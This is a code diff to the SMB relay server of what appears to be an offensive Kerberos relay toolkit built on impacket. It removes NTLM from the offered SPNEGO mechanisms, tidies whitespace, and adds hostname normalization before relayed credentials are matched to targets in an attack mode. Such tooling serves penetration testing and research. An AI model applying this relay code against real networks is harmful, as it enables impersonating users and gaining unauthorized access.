@@ -29,6 +29,8 @@ import random
 import string
 import socket
 
+import unicodedata
+
 from binascii import hexlify
 from impacket import smb, ntlm, LOG, smb3
 from impacket.nt_errors import STATUS_MORE_PROCESSING_REQUIRED, STATUS_ACCESS_DENIED, STATUS_SUCCESS
@@ -155,8 +157,7 @@ class SMBRelayServer(Thread):
         blob = GSSAPIHeader_SPNEGO_Init2()
         blob['tokenOid'] = '1.3.6.1.5.5.2'
         blob['innerContextToken']['mechTypes'].extend([MechType(TypesMech['KRB5 - Kerberos 5']),
-                                                       MechType(TypesMech['MS KRB5 - Microsoft Kerberos 5']),
-                                                       MechType(TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider'])])
+                                                       MechType(TypesMech['MS KRB5 - Microsoft Kerberos 5'])])
         blob['innerContextToken']['negHints']['hintName'] = "not_defined_in_RFC4178@please_ignore"
         respSMBCommand['Buffer'] = encoder.encode(blob)
 
@@ -219,7 +220,7 @@ class SMBRelayServer(Thread):
                         try:
                             if self.config.mode == 'EXPORT':
                                 authdata = get_kerberos_loot(securityBlob, self.config)
-                            
+
                             # Are we in attack mode? If so, launch attack against all targets
                             if self.config.mode == 'ATTACK':
                                 # If you're looking for the magic, it's in lib/utils/kerberos.py
@@ -570,9 +571,16 @@ class SMBRelayServer(Thread):
             else:
                 LOG.error('No attack configured for %s', parsed_target.scheme.upper())
 
+
+
     def do_relay(self, authdata):
         self.authUser = '%s/%s' % (authdata['domain'], authdata['username'])
         sclass, host = authdata['service'].split('/')
+        try:
+            host = host.encode('latin-1').decode('utf-8')
+        except (UnicodeDecodeError, UnicodeEncodeError):
+            host = host
+        host = unicodedata.normalize('NFKD', host).lower()
         for target in self.config.target.originalTargets:
             parsed_target = target
             if host.lower() in parsed_target.hostname.lower():
